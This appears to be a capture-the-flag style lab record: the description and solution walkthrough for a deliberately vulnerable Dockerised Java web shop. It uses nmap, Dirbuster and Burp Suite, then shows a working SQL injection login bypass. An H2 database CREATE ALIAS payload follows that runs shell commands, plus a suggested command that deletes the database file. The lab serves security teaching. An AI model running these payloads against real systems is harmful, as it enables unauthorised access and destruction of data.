{"description":"This lab provides a docker container with a vulnerable web application. RCE is the main focus of the lab, but there are many more vulnerabilities you can find.","goal":"<p>Try to execute java code on the victim's machine.<br /><br />Run the lab and connect to : <a href=\"http://localhost:8081/ATProgetto/index.jsp\">http://localhost:8081/ATProgetto/index.jsp</a></p>\n<p>Find as much vulnerabilities as you can!<br /><br />Creators : Dott.ssa Giuseppina Tuoro, Dott. Alessandro Placido Luise</p>\n<p>&nbsp;</p>","solution":"<p>Let's suppose we don't know the TCP port number of the machine. We will need to do a Port Probing with nmap</p>\n<p><img src=\"https://imagizer.imageshack.com/img922/8717/wH0cNa.png\" alt=\"\" width=\"456\" height=\"158\" /></p>\n<p>172.22.0.1 is the IP address. You can find it through the cmd \"ifconfig\".</p>\n<p>Let's find out what service is running on port 8081</p>\n<p><img src=\"https://imagizer.imageshack.com/img921/3296/ug91ja.png\" alt=\"\" width=\"567\" height=\"134\" /></p>\n<p>Now we know that the web application is hosted by an Apache Tomcat Server v. 9.0.2 and it's open on port 8081.</p>\n<p>We can use Dirbuster to investigate the architecture of Mobile Shop.</p>\n<p><img src=\"http://imageshack.com/a/img924/4357/TYTBgh.png\" alt=\"\" width=\"513\" height=\"365\" /></p>\n<p>This is the result of the analysis (bruteforce) :</p>\n<p><img src=\"http://imageshack.com/a/img922/2714/RFkXyA.png\" alt=\"\" width=\"544\" height=\"385\" /></p>\n<p>We can also check out the exceptions in the Error page.&nbsp;</p>\n<p><br /><img src=\"http://imageshack.com/a/img922/5169/Syn0fW.png\" alt=\"\" width=\"554\" height=\"390\" /></p>\n<p>This analysis provides a lot of informations about the web application. First, Mobile Shop is using the JavaScript library JQUERY and if you check out the load.js code, you will find out that it also uses Ajax for loading pages dinamically.<br /><br />Now that we have a clear vision of the architecture, let's try some attacks. The app uses forms for login, search and register. The first choice is to verify if it is vulnerable to SQL INJECTION. This is done with burpsuite.<br /><br />The Burpsuite tool HTTP Proxy operates as a web proxy server and sits as a man-in-the-middle between the browser and destination web servers. In order to do this, we will need to configure the browser. If you are using Firefox go to Preferences/Settings and select Manual proxy configuration. Configure the parameters as follows</p>\n<p><img src=\"http://imageshack.com/a/img924/9186/0oagQB.png\" alt=\"\" width=\"586\" height=\"570\" /></p>\n<p>In Burpsuite go to proxy/options. Edit the listener and select specific address in binding (127.0.0.1 is localhost). In request handling set \"support invisible proxying\". Set the listener on \"Running\".</p>\n<p><img src=\"http://imageshack.com/a/img921/6334/cb3WPO.png\" alt=\"\" width=\"574\" height=\"407\" /></p>\n<p>&nbsp;</p>\n<p>Now go to Proxy/Http History and try to do some actions like login with your account or search for an item. You will be able to see your plaintext requests.</p>\n<p><img src=\"http://imageshack.com/a/img924/9987/QgyIMB.png\" alt=\"\" width=\"584\" height=\"455\" /></p>\n<p>We will try an SQL INJECTION attack on the login forms (username and password). In order to to this we will need to catch the login.</p>\n<p>Go to Proxy/Intercept and set \"Intercept is on\". Now Login on Mobile Shop with some credentials (as example&nbsp; email : <a href=\"mailto:pina@p.it\">pina@p.it</a> password : 123qwerty).</p>\n<p>The web app will not respond to the request because burpsuite has intercepted it :<br /><img src=\"http://imageshack.com/a/img923/9882/cc069r.png\" alt=\"\" width=\"761\" height=\"401\" /></p>\n<p>Copy the content of the payload and go to&nbsp; Intruder/Positions. Modify the fields of username and password with two variables. Burpsuite will use this variables to \"bruteforce\" the web app with SQL requests.<br /><br /><img src=\"http://imageshack.com/a/img921/7173/hu2PyP.png\" alt=\"\" width=\"838\" height=\"409\" /></p>\n<p>In Target set Attack target as \"localhost\" and port as \"8081\". In Payloads go to Payload Options and click on Load. Select SQL.txt. Now return to Target and then Start attack.</p>\n<p>&nbsp;Wait for Burpsuite to do the malicious requests and check out the responses : <br /><br /></p>\n<p><img src=\"http://imageshack.com/a/img924/5144/dcZPLm.png\" alt=\"\" width=\"739\" height=\"508\" /></p>\n<p>GOTCHA! Putting&nbsp; <strong>' or 1=1 or ' '= '</strong> in the Username form will cause Mobile Shop to respond with \"Login avvenuto con successo\" (Login successful).</p>\n<p>Let's try it on the website.<br /><br /><img src=\"http://imageshack.com/a/img922/8589/j9g1eC.png\" alt=\"\" width=\"746\" height=\"576\" /><br /><br />You will login and be able to see account informations of the first user of the database. Mobile Shop is vulnerable to SQL injection Attacks.</p>\n<p>Now let's go on the Registration page. The forms are First Name, Last Name, Email, Password, Billing Address, Delivery Address.</p>\n<p>Since we can see the account informations in \"Personal Details\", we can try to inject a sql function in order to detect the type of database used by Mobile Shop. Let's suppose that in the act of registration the query is something like : <br /><span class=\"sqlcolor\" style=\"color: black;\"><code><span class=\"sqlkeywordcolor\" style=\"color: mediumblue;\">INSERT</span> <span class=\"sqlkeywordcolor\" style=\"color: mediumblue;\">INTO</span> <em>table_name</em> (<em>column1</em>,<em> column2</em>,<em> column3</em>, ...)</code><br /><code>\n<span class=\"sqlkeywordcolor\" style=\"color: mediumblue;\">VALUES</span> (<em>value1</em>,<em> value2</em>,<em> value3</em>, ...);</code> </span></p>\n<p><span class=\"sqlcolor\" style=\"color: black;\">We can modify the query putting <strong>anything ' , H2VERSION() ); --</strong> in billing address. H2 version is a function used by H2 databases that will display the version of the database. If the result is not null, it's clear that Mobile Shop is using a H2 based database. However, this process of discovery of the database can be automatized like previously seen.</span></p>\n<p><span class=\"sqlcolor\" style=\"color: black;\">So register to the site with something like that :<br /></span></p>\n<p><span class=\"sqlcolor\" style=\"color: black;\"><img src=\"http://imageshack.com/a/img922/8304/iJhEpJ.png\" alt=\"\" width=\"281\" height=\"488\" /><br />Then go to account information.<br /><br />In billing address there is the version of H2 database.</span></p>\n<p><span class=\"sqlcolor\" style=\"color: black;\"><img src=\"http://imageshack.com/a/img921/5324/fjZfLE.png\" alt=\"\" width=\"280\" height=\"568\" /><br /><br />Now let's try the RCE attack. H2 based databases have a very dangerous vulnerability involving CREATE ALIAS statement. Check it out at : <a href=\"https://www.exploit-db.com/exploits/45506\">https://www.exploit-db.com/exploits/45506</a> (EXPLOIT DB)<br />You can not only run a java code in the victim's machine, but also open a shell and do whatever you want (downloading keylogs, erasing the DB, etc.)</span></p>\n<p><span class=\"sqlcolor\" style=\"color: black;\">Here is the query we will put in the research form : <br /></span></p>\n<p><code><span class=\"sqlcolor\" style=\"color: black;\">';&nbsp; </span><span class=\"sqlcolor\" style=\"color: black;\"><span class=\"sqlcolor\" style=\"color: black;\"><span class=\"sqlkeywordcolor\" style=\"color: mediumblue;\">CREATE ALIAS</span> </span> SHELL_EXEC AS $$ String shellexec(String cmd) throws java.io.IOException { </span></code></p>\n<p><code><span class=\"sqlcolor\" style=\"color: black;\">java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\"); return s.hasNext() ? s.next() : \"\";&nbsp; }$$;<br /></span><span class=\"sqlcolor\" style=\"color: black;\"><span class=\"sqlcolor\" style=\"color: black;\"><span class=\"sqlcolor\" style=\"color: black;\"><span class=\"sqlkeywordcolor\" style=\"color: mediumblue;\">CALL </span></span></span>SHELL_EXEC('touch file1.txt'); --</span></code></p>\n<h4><strong><code></code></strong></h4>\n<p>&nbsp;This java code opens a shell in the victim's machine and creates a file called \"file1.txt\" with the cmd <strong>touch file1.txt</strong>.</p>\n<p>Try it yourself by putting that query in the search form. Then open the docker container and see that it has created the file file1.txt.<br /><br />You can also try to remove the DB with <strong>rm AT_DB.mv.db</strong> and destroy the website.</p>\n<p>To open the docker container&nbsp; launch the <strong>cmd docker ps</strong>, copy the container ID and then launch <strong>docker exec -it <em>container_id</em> bash</strong></p>\n<p><img src=\"http://imageshack.com/a/img922/6457/lbnIDp.png\" alt=\"\" width=\"669\" height=\"434\" /></p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>","author":"gx1"}
